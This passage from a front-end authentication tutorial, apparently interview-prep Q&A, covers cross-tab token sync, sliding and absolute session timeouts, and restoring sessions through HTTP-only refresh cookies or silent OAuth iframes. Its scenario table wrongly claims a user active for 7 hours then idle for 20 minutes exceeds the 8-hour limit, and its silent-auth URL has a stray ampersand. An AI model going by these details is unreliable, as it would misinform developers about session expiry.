      port.postMessage({ type: 'TOKEN', accessToken });
    }
  });
  
  port.start();
  
  // Send current token to new tab
  if (accessToken) {
    port.postMessage({ type: 'TOKEN', accessToken });
  }
});

// Main app
const worker = new SharedWorker('shared-worker.js');

worker.port.addEventListener('message', (event) => {
  if (event.data.type === 'TOKEN_UPDATED') {
    authService.accessToken = event.data.accessToken;
  }
});

worker.port.start();
```

**Pros:** Single source of truth, automatic token refresh for all tabs  
**Cons:** More complex, not widely supported

---

**Recommended approach:**

Combine BroadcastChannel with localStorage fallback:

```javascript
class SessionSync {
  constructor() {
    // Try BroadcastChannel
    if ('BroadcastChannel' in window) {
      this.channel = new BroadcastChannel('auth');
      this.channel.onmessage = this.handleMessage;
    }
    
    // Fallback to localStorage
    window.addEventListener('storage', this.handleStorage);
  }
  
  broadcast(type, data) {
    if (this.channel) {
      this.channel.postMessage({ type, data });
    } else {
      localStorage.setItem(`auth-${type}`, JSON.stringify(data));
      localStorage.removeItem(`auth-${type}`);
    }
  }
}
```
</details>

<details>
<summary><strong>Question 4:</strong> What's the difference between sliding timeout and absolute timeout?</summary>

**Answer:**

**Sliding Timeout (Activity-based):**

Session extends as long as user is active:

```javascript
const ACTIVITY_TIMEOUT = 30 * 60 * 1000; // 30 minutes
let lastActivity = Date.now();

// Track activity
['mousedown', 'keydown', 'scroll'].forEach(event => {
  window.addEventListener(event, () => {
    lastActivity = Date.now();
  });
});

// Check timeout
setInterval(() => {
  const inactive = Date.now() - lastActivity;
  
  if (inactive > ACTIVITY_TIMEOUT) {
    logout('Logged out due to inactivity');
  }
}, 60000);
```

**Timeline:**
```
Login → Active (resets) → Active (resets) → Active → Active → Inactive 30min → Logout
  |         |                |                 |        |           |
  0       +30min           +30min           +30min   +30min    +30min = Logout at 2h30m
```

Session can last indefinitely if user stays active!

---

**Absolute Timeout (Maximum duration):**

Session expires after fixed time regardless of activity:

```javascript
const ABSOLUTE_TIMEOUT = 8 * 60 * 60 * 1000; // 8 hours
const sessionStart = Date.now();

setInterval(() => {
  const sessionDuration = Date.now() - sessionStart;
  
  if (sessionDuration > ABSOLUTE_TIMEOUT) {
    logout('Session expired after 8 hours');
  }
}, 60000);
```

**Timeline:**
```
Login → Active → Active → Active → ... → 8 hours → Logout (forced)
  |                                           |
  0                                      +8h = Logout always
```

Session ends after 8 hours even if actively using app!

---

**Hybrid Approach (Best practice):**

Combine both for security + convenience:

```javascript
const ACTIVITY_TIMEOUT = 30 * 60 * 1000;  // 30 min inactive
const ABSOLUTE_TIMEOUT = 8 * 60 * 60 * 1000; // 8 hours max

let lastActivity = Date.now();
const sessionStart = Date.now();

function checkTimeout() {
  const inactive = Date.now() - lastActivity;
  const sessionAge = Date.now() - sessionStart;
  
  // Inactive timeout (sliding)
  if (inactive > ACTIVITY_TIMEOUT) {
    logout('Logged out due to 30 minutes inactivity');
    return;
  }
  
  // Absolute timeout
  if (sessionAge > ABSOLUTE_TIMEOUT) {
    logout('Session expired after 8 hours');
    return;
  }
  
  // Warn before absolute timeout (15 min warning)
  if (sessionAge > ABSOLUTE_TIMEOUT - 15 * 60 * 1000) {
    showWarning('Session expiring in 15 minutes');
  }
}

setInterval(checkTimeout, 60000);
```

**Scenarios:**

| Scenario | Sliding Only | Absolute Only | Hybrid |
|----------|-------------|---------------|--------|
| Active user 10 hours | Never timeout ❌ | Logout at 8h ✅ | Logout at 8h ✅ |
| Inactive 35 min | Logout ✅ | Still logged in ❌ | Logout ✅ |
| Active 7h, idle 20 min | Still logged in ❌ | Still logged in ❌ | Logout (>8h total) ✅ |

**Use cases:**
- **Sliding:** User convenience (don't interrupt active work)
- **Absolute:** Security (force periodic re-authentication)
- **Hybrid:** Best of both (convenience + security)
</details>

<details>
<summary><strong>Question 5:</strong> How do you handle session persistence across page reloads?</summary>

**Answer:**

**The Problem:**

Access tokens in memory disappear on page reload:

```javascript
// Before reload
authService.accessToken = "eyJhbGc..."; // In memory

// After reload
authService.accessToken = null; // Lost!
```

---

**Solution 1: Refresh Token in Cookie (Recommended)**

Server sets refresh token as HTTP-only cookie:

```javascript
// Server (login endpoint)
app.post('/api/auth/login', (req, res) => {
  const accessToken = generateAccessToken(user);
  const refreshToken = generateRefreshToken(user);
  
  // Set refresh token as HTTP-only cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,  // XSS protection
    secure: true,    // HTTPS only
    sameSite: 'strict',
    maxAge: 30 * 24 * 60 * 60 * 1000 // 30 days
  });
  
  res.json({ accessToken, expiresIn: 900 });
});

// Client restores session on page load
class AuthService {
  async init() {
    // On page load, access token is null
    if (!this.accessToken) {
      try {
        // Attempt to refresh using cookie
        await this.refreshAccessToken();
      } catch {
        // No valid refresh token - not authenticated
        return false;
      }
    }
    return true;
  }
  
  async refreshAccessToken() {
    const response = await fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include' // Send refresh token cookie
    });
    
    const { accessToken } = await response.json();
    this.accessToken = accessToken; // Restore in memory
    return accessToken;
  }
}

// App initialization
async function initApp() {
  const authenticated = await authService.init();
  
  if (authenticated) {
    renderApp();
  } else {
    renderLogin();
  }
}
```

**Flow:**
1. Page loads → Access token null
2. Call `/api/auth/refresh` with refresh token cookie
3. Get new access token → Store in memory
4. Continue app

**Pros:** ✅ Secure (HTTP-only), ✅ Automatic persistence  
**Cons:** Requires server roundtrip on page load

---

**Solution 2: Silent Authentication (OAuth)**

Use hidden iframe to check SSO session:

```javascript
async function silentAuth() {
  return new Promise((resolve, reject) => {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    
    // Auth provider URL with prompt=none
    iframe.src = 'https://auth.example.com/authorize?' +
      'client_id=xxx&' +
      'redirect_uri=' + encodeURIComponent(window.location.origin + '/callback') +
      '&response_type=token&' +
      '&prompt=none'; // Don't show login UI
    
    window.addEventListener('message', (event) => {
      if (event.origin !== window.location.origin) return;
      
      if (event.data.accessToken) {
        resolve(event.data.accessToken);
      } else {
        reject(new Error('Not authenticated'));
      }
      
      document.body.removeChild(iframe);
    });
    
    document.body.appendChild(iframe);
    
    // Timeout after 5 seconds
    setTimeout(() => {
      document.body.removeChild(iframe);
      reject(new Error('Silent auth timeout'));
    }, 5000);
  });
}

// On page load
async function initApp() {
  try {
    const accessToken = await silentAuth();
    authService.accessToken = accessToken;
    renderApp();
  } catch {
    renderLogin();
  }
}
```

**Pros:** Works with third-party auth providers  
**Cons:** Requires iframe, affected by browser privacy features

---

**Solution 3: Session Storage + Confirmation (Last resort)**

Store encrypted token in localStorage (not recommended for production):

```javascript
// Only if cannot use HTTP-only cookies

// Encrypt token before storing
function encryptToken(token, key) {
  // Use Web Crypto API for encryption
  // Simplified example
  return btoa(token + key); // NOT secure, use proper crypto
}

// On login
function saveSession(accessToken, refreshToken) {
  const encrypted = encryptToken(refreshToken, userFingerprint);
  localStorage.setItem('session', encrypted);
  authService.accessToken = accessToken; // Memory
}

// On page load
function restoreSession() {
  const encrypted = localStorage.getItem('session');
  if (!encrypted) return false;
  
  const refreshToken = decryptToken(encrypted, userFingerprint);
  // Use refresh token to get new access token
  authService.refreshAccessToken(refreshToken);
}
```

**⚠️ Warning:** localStorage vulnerable to XSS. Only use if:
- Cannot control backend (HTTP-only cookies impossible)
- Implement proper encryption
- Accept security trade-offs

**Recommended:** Always use HTTP-only cookies for refresh tokens!
</details>

## References

- [Auth0 Session Management Best Practices](https://auth0.com/blog/application-session-management-best-practices/)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [RFC 6749 - OAuth 2.0 Authorization Framework](https://tools.ietf.org/html/rfc6749)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [BroadcastChannel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API)

## Common Mistakes